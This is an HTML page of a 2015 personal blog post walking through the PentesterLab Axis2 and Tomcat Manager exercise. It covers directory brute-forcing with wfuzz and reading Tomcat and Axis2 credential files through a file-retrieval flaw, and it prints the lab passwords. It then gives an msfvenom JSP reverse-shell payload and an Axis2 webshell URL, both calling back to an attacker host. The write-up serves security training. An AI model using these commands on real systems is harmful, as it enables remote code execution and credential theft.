
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>[PentesterLab] Axis2 Web Service and Tomcat Manager - F4l13n5n0w</title>
  <meta name="author" content="F4l13n5n0w">

  
  <meta name="description" content="&ldquo;This course details the exploitation of an issue in an Axis2 Web service and how using this issue it is possible to retrieve arbitrary files. &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://f4l13n5n0w.github.io/blog/2015/05/30/pentesterlab-axis2-web-service-and-tomcat-manager/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="F4l13n5n0w" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">F4l13n5n0w</a></h1>
  
    <h2>Security & Pen testing learning notes &#8211; F4l13n5n0w</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="f4l13n5n0w.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">

  <li><a href="/">段子 | Blogging</a></li>
  <li><a href="/reading">藏♥品 | Reading</a><li>
  <li><a href="/about">玩意儿 | Coding</a><li>

</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">[PentesterLab] Axis2 Web Service and Tomcat Manager</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-30T08:16:43-04:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>30</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:16 am</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><p>&ldquo;This course details the exploitation of an issue in an Axis2 Web service and how using this issue it is possible to retrieve arbitrary files. Then using this, we will see how an attacker can retrieve Tomcat users&#8217; file to access the Tomcat Manager and gain commands execution on the server.&rdquo; &ndash; <font color="green"><em>PentesterLab</em></font></p>

<p>More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/axis2_and_tomcat_manager/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/axis2_and_tomcat_manager/course">course</a> is highly recommanded to read.</p>

<p>Difficulty: 3 / 5</p>

<!-- more -->


<h2>Walkthrough</h2>

<p>Based on the result of NMAP scan, tcp port 80 is open.</p>

<p>Access tcp port 80 and use DirBuster/wfuzz to brute force hidden path and found &ldquo;/axis2&rdquo;:</p>

<p>wfuzz command to burte force hidden path:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://10.10.10.129/FUZZ 2>/dev/null</span></code></pre></td></tr></table></div></figure>


<p><img src="/downloads/Axis2_Web_Tomcat/1.png"></p>

<p>Due to axis2&rsquo;s ProxyService has information retrieving vulnerability, exploit it and find users&#8217; passwords information.</p>

<p>Here are two methods to upload webshell.</p>

<h3>Method 1</h3>

<p>Retrieving Tomcat manager configuration to get login credentials.</p>

<p>In Debian Linux, the tomcat configuration file <code>tomcat-users.xml</code> has default location: <font color="red"><em>/etc/tomcat6/tomcat-users.xml</em></font></p>

<p><img src="/downloads/Axis2_Web_Tomcat/2.png"></p>

<p>From <code>tomcat-users.xml</code> file, the tomcat manager-gui login password can be found: <font color="red"><em>manager / !mp0ss!bl32gu355</em></font></p>

<p>Then login tomcat manager from the URL <code>http://10.10.10.129/manager/html</code> to upload and deploy JSP webshell in WAR file.</p>

<p>Use msfvenom to generate JSP reverse shell and build the war file using <code>jar</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ mkdir webshell
</span><span class='line'>$ cd webshell
</span><span class='line'>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.131 LPORT=4444 -f raw > sh4.jsp
</span><span class='line'>$ jar -cvf ../webshell.jar *</span></code></pre></td></tr></table></div></figure>


<p>Use the following URL to trigger reverse shell connect back to my Kali on port 4444:</p>

<p><code>http://10.10.10.129/webshell/sh4.jsp</code></p>

<p><img src="/downloads/Axis2_Web_Tomcat/3.png"></p>

<h3>Method 2</h3>

<p>Retrieving Axis2 configuration to get login credentials.</p>

<p>In Debian Linux, the axis2 configuration file <code>axis2.xml</code> has default location: <font color="red"><em>/var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml</em></font></p>

<p><img src="/downloads/Axis2_Web_Tomcat/4.png"></p>

<p>From <code>axis2.xml</code> file, the axis2 admin login password can be found: <font color="red">admin / axis2</font></p>

<p>Then login axis2 admin page from the URL <code>http://10.10.10.129/axis2/axis2-admin/</code> to upload and deploy axis2 webshell in AAR file.</p>

<p>Here I use <code>Cat.aar</code> <a href="https://github.com/tennc/webshell/tree/master/other/cat.aar">axis2 webshell</a>, upload and deploy it as axis2 service.</p>

<p><img src="/downloads/Axis2_Web_Tomcat/5.png"></p>

<p>Then use the following URL to trigger reverse shell connect back to my Kali on port 5555:</p>

<p><code>http://10.10.10.129/axis2/services/Cat/shell?host=10.10.10.131&amp;port=5555</code></p>

<p><img src="/downloads/Axis2_Web_Tomcat/6.png"></p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">F4l13n5n0w</span></span>

      




<time class='entry-date' datetime='2015-05-30T08:16:43-04:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>30</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:16 am</span></time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/axis2/'>axis2</a>, <a class='category' href='/blog/categories/lfi/'>lfi</a>, <a class='category' href='/blog/categories/pentesterlab/'>pentesterlab</a>, <a class='category' href='/blog/categories/tomcat/'>tomcat</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  
  
    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/05/25/vulnhub-kioptrix-2014/" title="Previous Post: [Vulnhub] Kioptrix 2014">&laquo; [Vulnhub] Kioptrix 2014</a>
      
      
        <a class="basic-alignment right" href="/blog/2015/05/31/pentesterlab-php-lfi-and-post-exploitation/" title="Next Post: [PentesterLab] PHP LFI &amp; Post Exploitation">[PentesterLab] PHP LFI &amp; Post Exploitation &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Previous Blog</h1>
  <p><a href='http://fallensnow-jack.blogspot.com/'>http://fallensnow-jack.blogspot.com/</a></p>
  <h1>About Me</h1>
  <p>On the way to be a hacker</p>
  <ul id="certifications">
    <li class="post">
      <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional"><img src="/downloads/oscp-1.png" alt="Offensive Security Certified Professional" /></a>
    </li>
  </ul>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/06/24/vulnhub-tr0ll-2/">[Vulnhub]Tr0ll: 2</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/06/21/vulnhub-knock-knock-1-dot-1/">[Vulnhub]Knock-Knock: 1.1</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/06/13/vulnhub-tophatsec-freshly/">[Vulnhub]TopHatSec: Freshly</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/05/31/pentesterlab-php-lfi-and-post-exploitation/">[PentesterLab] PHP LFI &amp; Post Exploitation</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/05/30/pentesterlab-axis2-web-service-and-tomcat-manager/">[PentesterLab] Axis2 Web Service and Tomcat Manager</a>
      </li>
    
  </ul>
</section>




<section>
  <h1>Tag Cloud</h1>
    <span id="tag-cloud"><a href='/blog/categories/axis2' style='font-size: 106.66666666666667%'>axis2(1)</a> <a href='/blog/categories/bash-bag' style='font-size: 106.66666666666667%'>bash bag(1)</a> <a href='/blog/categories/bof' style='font-size: 113.33333333333333%'>bof(2)</a> <a href='/blog/categories/commands-injection' style='font-size: 106.66666666666667%'>commands injection(1)</a> <a href='/blog/categories/freshly' style='font-size: 106.66666666666667%'>freshly(1)</a> <a href='/blog/categories/kioptrix2014' style='font-size: 106.66666666666667%'>kioptrix2014(1)</a> <a href='/blog/categories/knock-knock' style='font-size: 106.66666666666667%'>knock-knock(1)</a> <a href='/blog/categories/ldap-injection' style='font-size: 106.66666666666667%'>ldap injection(1)</a> <a href='/blog/categories/lfi' style='font-size: 106.66666666666667%'>lfi(1)</a> <a href='/blog/categories/mysql-injection' style='font-size: 106.66666666666667%'>mysql injection(1)</a> <a href='/blog/categories/oscp' style='font-size: 106.66666666666667%'>oscp(1)</a> <a href='/blog/categories/pentesterlab' style='font-size: 160.0%'>pentesterlab(9)</a> <a href='/blog/categories/php-lfi' style='font-size: 106.66666666666667%'>php lfi(1)</a> <a href='/blog/categories/play-framework' style='font-size: 106.66666666666667%'>play framework(1)</a> <a href='/blog/categories/post-exploitation' style='font-size: 106.66666666666667%'>post exploitation(1)</a> <a href='/blog/categories/pwk' style='font-size: 106.66666666666667%'>pwk(1)</a> <a href='/blog/categories/session-injection' style='font-size: 106.66666666666667%'>session injection(1)</a> <a href='/blog/categories/shellshock' style='font-size: 106.66666666666667%'>shellshock(1)</a> <a href='/blog/categories/sql-injection' style='font-size: 113.33333333333333%'>sql injection(2)</a> <a href='/blog/categories/tomcat' style='font-size: 106.66666666666667%'>tomcat(1)</a> <a href='/blog/categories/tophatsec' style='font-size: 106.66666666666667%'>tophatsec(1)</a> <a href='/blog/categories/tr0ll' style='font-size: 106.66666666666667%'>tr0ll(1)</a> <a href='/blog/categories/upload-bypass' style='font-size: 106.66666666666667%'>upload bypass(1)</a> <a href='/blog/categories/vulnhub' style='font-size: 126.66666666666667%'>vulnhub(4)</a> <a href='/blog/categories/web-for-pentester' style='font-size: 120.0%'>web for pentester(3)</a> <a href='/blog/categories/xml-injection' style='font-size: 106.66666666666667%'>xml injection(1)</a> <a href='/blog/categories/xss' style='font-size: 113.33333333333333%'>xss(2)</a> </span>
</section>
<section>
  <h1>Categories</h1>
    <ul id="category-list"><li><a href='/blog/categories/axis2/'>axis2 (1)</a></li><li><a href='/blog/categories/bash-bag/'>bash bag (1)</a></li><li><a href='/blog/categories/bof/'>bof (2)</a></li><li><a href='/blog/categories/commands-injection/'>commands injection (1)</a></li><li><a href='/blog/categories/freshly/'>freshly (1)</a></li><li><a href='/blog/categories/kioptrix2014/'>kioptrix2014 (1)</a></li><li><a href='/blog/categories/knock-knock/'>knock-knock (1)</a></li><li><a href='/blog/categories/ldap-injection/'>ldap injection (1)</a></li><li><a href='/blog/categories/lfi/'>lfi (1)</a></li><li><a href='/blog/categories/mysql-injection/'>mysql injection (1)</a></li><li><a href='/blog/categories/oscp/'>oscp (1)</a></li><li><a href='/blog/categories/pentesterlab/'>pentesterlab (9)</a></li><li><a href='/blog/categories/php-lfi/'>php lfi (1)</a></li><li><a href='/blog/categories/play-framework/'>play framework (1)</a></li><li><a href='/blog/categories/post-exploitation/'>post exploitation (1)</a></li><li><a href='/blog/categories/pwk/'>pwk (1)</a></li><li><a href='/blog/categories/session-injection/'>session injection (1)</a></li><li><a href='/blog/categories/shellshock/'>shellshock (1)</a></li><li><a href='/blog/categories/sql-injection/'>sql injection (2)</a></li><li><a href='/blog/categories/tomcat/'>tomcat (1)</a></li><li><a href='/blog/categories/tophatsec/'>tophatsec (1)</a></li><li><a href='/blog/categories/tr0ll/'>tr0ll (1)</a></li><li><a href='/blog/categories/upload-bypass/'>upload bypass (1)</a></li><li><a href='/blog/categories/vulnhub/'>vulnhub (4)</a></li><li><a href='/blog/categories/web-for-pentester/'>web for pentester (3)</a></li><li><a href='/blog/categories/xml-injection/'>xml injection (1)</a></li><li><a href='/blog/categories/xss/'>xss (2)</a></li></ul>
</section>

  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - F4l13n5n0w -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  



<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) {return;}
  js = d.createElement(s); js.id = id; js.async = true;
  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>









</body>
</html>
